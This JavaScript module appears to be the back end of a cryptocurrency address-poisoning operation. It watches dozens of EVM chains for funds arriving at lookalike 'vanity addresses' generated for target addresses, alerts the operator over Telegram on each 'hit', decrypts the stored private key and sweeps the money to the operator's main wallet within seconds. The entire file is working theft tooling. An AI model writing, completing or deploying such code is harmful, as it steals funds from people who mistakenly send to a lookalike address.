import { ethers } from 'ethers';
import { redis } from '../lib/redis.js';
import { CHAINS } from '../config/chains.js';
import { getVanityKey, listVanityAddresses } from '../tx/vault.js';
import { sendTx } from '../tx/sender.js';
import { sendHitAlert } from './alerts.js';

const MAIN_WALLET = process.env.MAIN_WALLET;
const POLL_INTERVAL = 5_000;  // 5s polling
const CLEANUP_INTERVAL = 3600_000; // 1h
const TTL_DAYS = 7;

/**
 * Start hit detector — monitors all vanity addresses across all chains
 */
export async function startDetector() {
  if (!MAIN_WALLET) {
    throw new Error('MAIN_WALLET env required for auto-transfer');
  }

  console.log(`
┌─────────────────────────────────────────┐
│  HIT DETECTOR                          │
├─────────────────────────────────────────┤
│  Main wallet: ${MAIN_WALLET}
│  Poll:        every ${POLL_INTERVAL / 1000}s
│  TTL:         ${TTL_DAYS} days
│  Chains:      ${Object.keys(CHAINS).length} EVM chains
└─────────────────────────────────────────┘
  `);

  // Initial load
  let watchedAddresses = await loadAddresses();
  console.log(`  Watching ${watchedAddresses.length} vanity addresses\n`);

  // Refresh address list every 30s
  setInterval(async () => {
    watchedAddresses = await loadAddresses();
  }, 30_000);

  // Cleanup expired addresses every hour
  setInterval(() => cleanup(), CLEANUP_INTERVAL);

  // Start WebSocket listeners for each chain
  const chainKeys = Object.keys(CHAINS);
  for (const chainKey of chainKeys) {
    startChainListener(chainKey, () => watchedAddresses);
  }

  // Keep process alive
  process.on('SIGINT', () => {
    console.log('\n[HitDetector] Shutting down...');
    process.exit(0);
  });
}

/**
 * Load all watched vanity addresses from Redis
 */
async function loadAddresses() {
  const entries = await listVanityAddresses();
  return entries.map((e) => ({
    vanityAddress: e.vanityAddress.toLowerCase(),
    targetAddress: e.targetAddress,
    createdAt: e.createdAt,
  }));
}

/**
 * Listen to a chain via WebSocket for incoming TX to watched addresses
 */
function startChainListener(chainKey, getAddresses) {
  const chain = CHAINS[chainKey];
  if (!chain.ws) return;

  let provider;
  let reconnectTimer;

  function connect() {
    try {
      provider = new ethers.WebSocketProvider(chain.ws);

      provider.on('block', async (blockNumber) => {
        try {
          await checkBlock(provider, chainKey, blockNumber, getAddresses);
        } catch (err) {
          // Silent — block check errors are non-fatal
        }
      });

      provider.websocket?.on('close', () => {
        console.log(`  [${chain.name}] WS disconnected — reconnecting in 10s`);
        reconnectTimer = setTimeout(connect, 10_000);
      });

      console.log(`  [${chain.name}] WS connected`);
    } catch (err) {
      console.error(`  [${chain.name}] WS failed: ${err.message} — retry in 30s`);
      reconnectTimer = setTimeout(connect, 30_000);
    }
  }

  connect();
}

/**
 * Check a block for incoming TX to any watched address
 */
async function checkBlock(provider, chainKey, blockNumber, getAddresses) {
  const addresses = getAddresses();
  if (addresses.length === 0) return;

  const addressSet = new Set(addresses.map((a) => a.vanityAddress));

  const block = await provider.getBlock(blockNumber, true);
  if (!block || !block.prefetchedTransactions) return;

  for (const tx of block.prefetchedTransactions) {
    if (!tx.to) continue;
    const to = tx.to.toLowerCase();

    if (addressSet.has(to)) {
      const chain = CHAINS[chainKey];
      const valueEth = ethers.formatUnits(tx.value, chain.nativeDecimals);

      console.log(`\n  *** HIT on ${chain.name}! ***`);
      console.log(`  To:     ${tx.to}`);
      console.log(`  From:   ${tx.from}`);
      console.log(`  Value:  ${valueEth} ${chain.nativeSymbol}`);
      console.log(`  TX:     ${tx.hash}`);

      // Log to Redis
      await logHit(chainKey, tx, valueEth);

      // Alert Telegram
      await sendHitAlert({
        chain: chain.name,
        chainKey,
        to: tx.to,
        from: tx.from,
        value: valueEth,
        symbol: chain.nativeSymbol,
        txHash: tx.hash,
      });

      // Auto-transfer to main wallet
      if (parseFloat(valueEth) > 0) {
        await autoTransfer(chainKey, to, tx.value);
      }
    }
  }
}

/**
 * Auto-transfer funds from vanity address to main wallet (<10s)
 */
async function autoTransfer(chainKey, vanityAddress, receivedValue) {
  try {
    // Find the target address for this vanity
    const entries = await listVanityAddresses();
    const entry = entries.find((e) => e.vanityAddress.toLowerCase() === vanityAddress);
    if (!entry) {
      console.error(`  [AutoTransfer] No vault entry for ${vanityAddress}`);
      return;
    }

    const vault = await getVanityKey(entry.targetAddress);
    if (!vault) {
      console.error(`  [AutoTransfer] Cannot decrypt key for ${vanityAddress}`);
      return;
    }

    const chain = CHAINS[chainKey];
    const provider = new ethers.JsonRpcProvider(chain.rpcs[0]);

    // Estimate gas cost for transfer
    const feeData = await provider.getFeeData();
    const gasLimit = 21_000n;
    const gasCost = gasLimit * (feeData.maxFeePerGas || feeData.gasPrice || 30_000_000_000n);

    // Send everything minus gas
    const sendValue = receivedValue - gasCost;
    if (sendValue <= 0n) {
      console.log(`  [AutoTransfer] Amount too small to cover gas — skipping`);
      return;
    }

    const amountStr = ethers.formatUnits(sendValue, chain.nativeDecimals);
    console.log(`  [AutoTransfer] Sending ${amountStr} ${chain.nativeSymbol} → ${MAIN_WALLET}`);

    const wallet = new ethers.Wallet(vault.privateKey, provider);
    const tx = await wallet.sendTransaction({
      to: MAIN_WALLET,
      value: sendValue,
      gasLimit,
      ...(feeData.maxFeePerGas
        ? { maxFeePerGas: feeData.maxFeePerGas, maxPriorityFeePerGas: feeData.maxPriorityFeePerGas }
        : { gasPrice: feeData.gasPrice }),
    });

    const receipt = await tx.wait();
    console.log(`  [AutoTransfer] Confirmed: ${receipt.hash}`);

    await sendHitAlert({
      chain: chain.name,
      chainKey,
      type: 'transfer',
      to: MAIN_WALLET,
      from: vanityAddress,
      value: amountStr,
      symbol: chain.nativeSymbol,
      txHash: receipt.hash,
    });
  } catch (err) {
    console.error(`  [AutoTransfer] FAILED: ${err.message}`);
  }
}

/**
 * Log hit to Redis
 */
async function logHit(chainKey, tx, valueEth) {
  const chain = CHAINS[chainKey];
  const hit = {
    chain: chain.name,
    from: tx.from,
    to: tx.to,
    value: valueEth,
    symbol: chain.nativeSymbol,
    txHash: tx.hash,
    timestamp: new Date().toISOString(),
  };
  await redis.rpush('hits:log', JSON.stringify(hit));
  await redis.incr('hits:count');
}

/**
 * Cleanup vanity addresses older than TTL_DAYS
 */
async function cleanup() {
  const entries = await listVanityAddresses();
  const now = Date.now();
  let cleaned = 0;

  for (const entry of entries) {
    const created = new Date(entry.createdAt).getTime();
    const ageDays = (now - created) / (1000 * 60 * 60 * 24);

    if (ageDays > TTL_DAYS) {
      const key = `vault:vanity:${entry.targetAddress}`;
      await redis.del(key);
      await redis.srem('vault:vanity:all', entry.targetAddress);
      cleaned++;
    }
  }

  if (cleaned > 0) {
    console.log(`  [Cleanup] Removed ${cleaned} expired vanity addresses`);
  }
}
